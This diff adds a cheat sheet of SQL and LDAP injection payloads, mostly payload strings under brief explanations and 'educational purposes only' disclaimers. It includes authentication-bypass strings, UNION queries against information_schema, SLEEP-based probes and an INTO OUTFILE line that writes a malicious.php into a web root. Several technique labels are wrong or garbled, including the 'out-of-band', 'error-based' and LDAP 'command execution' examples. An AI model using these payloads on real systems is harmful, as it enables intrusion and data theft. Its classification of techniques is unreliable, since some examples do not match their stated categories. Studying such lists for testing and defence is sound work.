@@ -1,0 +1,108 @@
+Injection Vulnerabilities:
+
+Blind SQL Injection:
+
+1. Boolean-Based Payloads:
+-->       - `' OR 1=1 --`
+-->       - `' OR 'x'='x' --`
+-->       - `' OR 'a'='a' --`
+
+2. Time-Based Payloads:
+-->       - `' OR SLEEP(5) --`
+-->       - `' OR (SELECT * FROM users WHERE username='admin' AND IF(SLEEP(5), 1, 0)) --`
+
+3. Error-Based Payloads:
+-->       - `' OR 1=1; SELECT * FROM users WHERE username='admin' --`
+-->       - `' OR 1=1 UNION SELECT null, table_name FROM information_schema.tables WHERE table_schema=database() --`
+
+4. Out-of-Band (OOB) Payloads:
+-->       - `' OR 1=1; SELECT * FROM users INTO OUTFILE '/var/www/html/malicious.php' --`
+-->       - `' OR 1=1; SELECT * FROM users INTO DUMPFILE '/var/lib/mysql/mysql.dump' --`
+
+
+Please note that these payloads are provided for educational purposes only. Using them against systems 
+without proper authorization is illegal and unethical. It is important to obtain permission from the system owner 
+and conduct such tests in a controlled and responsible manner.
+
+
+
+Numeric Injection:
+
+Numeric injection is a technique used in blind SQL injection attacks when the application's backend database relies on numeric data types. 
+By exploiting vulnerabilities in input validation or sanitization, an attacker can inject malicious payloads that manipulate the SQL query's logic 
+to extract sensitive information or perform unauthorized actions. Here are some examples of numeric injection payloads:
+
+1) Numeric Comparison:
+
+-->    1 OR 1=1 --
+-->    0 UNION SELECT * FROM users --
+-->    9 AND 1=0 UNION ALL SELECT table_name FROM information_schema.tables --
+
+2) Ordering and Limiting:
+
+-->    ORDER BY 1 --
+-->    ORDER BY 1,2 --
+-->    LIMIT 5 OFFSET 2 --
+
+3) Subquery Injection:
+
+-->    (SELECT COUNT(*) FROM users) > 1 --
+-->    (SELECT username FROM users LIMIT 1)
+
+4) Time-Based Injection:
+
+-->    AND SLEEP(5) --
+-->    AND (SELECT * FROM users WHERE username='admin' AND IF(SLEEP(5), 1, 0))
+
+
+5) Error-Based Injection:
+
+-->    AND (SELECT 1/0 FROM users)
+
+It's important to note that these examples are meant for educational purposes only, and using them against systems 
+without proper authorization is illegal and unethical. Always ensure you have permission from the system owner and 
+adhere to responsible disclosure practices when performing security testing.
+
+LDAP Injection:
+
+LDAP (Lightweight Directory Access Protocol) injection is a type of security vulnerability that occurs when untrusted 
+user input is not properly validated or sanitized before being used in LDAP queries. Attackers can exploit this vulnerability 
+to manipulate LDAP queries and potentially gain unauthorized access to an application's directory services. 
+
+Here are some examples of LDAP injection payloads:
+
+1) Basic LDAP Injection:
+
+-->    *)(uid=*))(|(uid=*
+-->    *)(uid=admin)(password=*)
+
+2)LDAP Injection for Authentication Bypass:
+
+-->    admin)(|(password=*))
+-->    *)(uid=admin))(|(password=*))
+
+3) LDAP Injection for Data Extraction:
+
+-->    uid=*)(objectClass=*
+-->    )(uid=*)(objectClass=user)
+
+4) LDAP Injection for Command Execution:
+
+-->    uid=*)(!(uid=*))(|(uid=admin)(shell=*))
+-->    )(uid=*)(password=*)(!(uid=*))(|(uid=admin)(shell=*))
+
+5) LDAP Injection for Denial of Service:
+
+-->    *)(uid=<your payload>)
+
+It's important to note that these examples are provided for educational purposes only. 
+Performing LDAP injection attacks on systems without proper authorization is illegal and unethical. 
+Always obtain permission from the system owner and conduct security testing responsibly and within legal boundaries. 
+Additionally, organizations should implement proper input validation and parameterized queries to mitigate the risk of LDAP injection vulnerabilities.
+
+
+
+
+
+
+
